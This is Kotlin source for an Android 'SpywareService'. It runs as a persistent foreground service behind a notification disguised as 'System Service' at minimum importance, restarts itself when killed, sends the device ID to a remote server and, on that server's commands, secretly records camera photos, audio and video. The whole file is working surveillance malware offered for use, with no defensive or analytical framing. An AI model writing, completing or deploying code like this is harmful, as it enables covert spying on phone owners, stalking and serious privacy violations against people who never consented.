package com.webrtc.spyware

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import org.json.JSONObject

/**
 * SpywareService – foreground service that keeps the app alive,
 * manages SocketManager + MediaCaptureManager.
 * Handles auto-reconnect and capture commands.
 */
class SpywareService : Service() {
    private val TAG = "SpywareService"
    private val CHANNEL_ID = "SpywareServiceChannel"
    private val NOTIFICATION_ID = 1

    // TODO: Replace with your Render Node.js backend URL
    private val SERVER_URL = "https://YOUR-RENDER-APP.onrender.com"

    private lateinit var socketManager: SocketManager
    private lateinit var mediaCaptureManager: MediaCaptureManager

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())

        val deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"

        socketManager = SocketManager(
            serverUrl = SERVER_URL,
            deviceId = deviceId,
            onCaptureCommand = { type, params ->
                handleCaptureCommand(type, params)
            }
        )

        mediaCaptureManager = MediaCaptureManager(this, socketManager)
        socketManager.connect()
        Log.d(TAG, "Service started, device: $deviceId")
    }

    private fun handleCaptureCommand(type: String, params: JSONObject) {
        when (type) {
            "image" -> {
                val useFront = (params.optString("camera", "front") == "front")
                mediaCaptureManager.captureImage(useFront)
            }
            "audio" -> {
                val duration = params.optInt("duration", 10)
                mediaCaptureManager.captureAudio(duration)
            }
            "video" -> {
                val duration = params.optInt("duration", 15)
                val useFront = (params.optString("camera", "back") == "front")
                mediaCaptureManager.captureVideo(duration, useFront)
            }
            "start-stream" -> Log.d(TAG, "Live stream requested – handle in Activity")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Auto-restart if killed
    }

    override fun onDestroy() {
        mediaCaptureManager.release()
        socketManager.disconnect()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Background Service", NotificationManager.IMPORTANCE_MIN
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }
}
